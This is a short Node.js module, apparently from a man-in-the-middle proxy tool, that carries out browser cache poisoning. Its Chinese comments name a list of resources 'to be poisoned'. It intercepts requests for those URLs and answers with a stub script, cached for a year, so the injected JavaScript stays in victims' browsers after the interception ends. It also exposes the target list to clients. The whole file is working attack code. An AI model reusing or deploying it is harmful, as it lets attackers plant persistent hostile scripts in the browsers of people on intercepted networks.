'use strict';

var STUB_SYMBOL = /\$URL_RAW/g,
	PATH = __dirname + '/asset/',
	FILE_TARGET = PATH + 'target.json',
	FILE_STUB = PATH + 'stub.js';


// 待投毒的资源列表
var mTargetMap = require(FILE_TARGET),
	mTargetBuf = new Buffer( JSON.stringify(mTargetMap) );

// 预加载的内容
var mStubCode;


exports.init = function(app) {

	// 预加载的内容
	mStubCode = app.util.readJs(FILE_STUB, app.param.debug);
	if (!mStubCode) {
		app.util.err('fail load stub.js');
		return;
	}

	// 拦截预加载的请求
	app.msg.on('WebReqBegin', handleWebReqBegin);
	return true;
};


function handleWebReqBegin(e) {

	// 是否请求需投毒的资源
	var req = e.clientReq;

	// 请求下载列表
	if (req.url == '/?!preload_list') {
		e.output(200, {}, mTargetBuf);
		return;
	}

	// 请求预加载资源
	var target = mTargetMap[e.fullUrl];
	if (!target) {
		return;
	}

	// 读取二进制内容
	var data = target._data;
	if (!data) {
		var str = mStubCode.replace(STUB_SYMBOL, e.fullUrl);
		data = target._data = new Buffer(str);
	}

	// 返回封包
	var etag = target.etag;
	var hdr = {
		'content-type'  : 'text/javascript; charset=utf-8',
		'cache-control' : 'max-age=31536000',
		'expires'       : 'Fri, 31 Jan 2020 16:00:00 GMT'
	};
	if (etag) {
		hdr['etag'] = etag;
	}

	e.output(200, hdr, data);
	return false;
};
